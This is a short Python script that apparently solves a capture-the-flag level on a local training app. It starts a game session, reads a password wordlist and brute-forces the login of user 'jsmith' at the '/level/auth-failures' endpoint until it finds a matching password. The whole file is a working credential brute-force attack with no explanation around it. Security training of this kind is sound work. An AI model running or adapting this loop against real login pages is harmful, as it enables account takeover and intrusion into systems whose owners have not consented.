import requests

BASE_URL = "http://127.0.0.1:5001"
WORDLIST_PATH = "scripts/wordlist.txt"  # the file you downloaded from the app
USERNAME = "jsmith"

session = requests.Session()
print("Creating a new player via /start...")
resp = session.post(f"{BASE_URL}/start", data={"difficulty": "expert"})
print(f"Got cookie: {session.cookies.get('ctf_player_token')}")

print("Loading wordlist...")
with open(WORDLIST_PATH, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"Loaded {len(passwords)} passwords to try.")

print("Starting brute-force attempts...")
found_password = None

for pw in passwords:
    resp = session.post(
        f"{BASE_URL}/level/auth-failures",
        data={"action": "attempt_login", "username": USERNAME, "password": pw},
    )
    if "Login successful" in resp.text:
        found_password = pw
        print(f"SUCCESS! Password found: {pw}")
        break
    else:
        print(f"Tried '{pw}' -- failed")

if not found_password:
    print("Exhausted wordlist, no password matched.")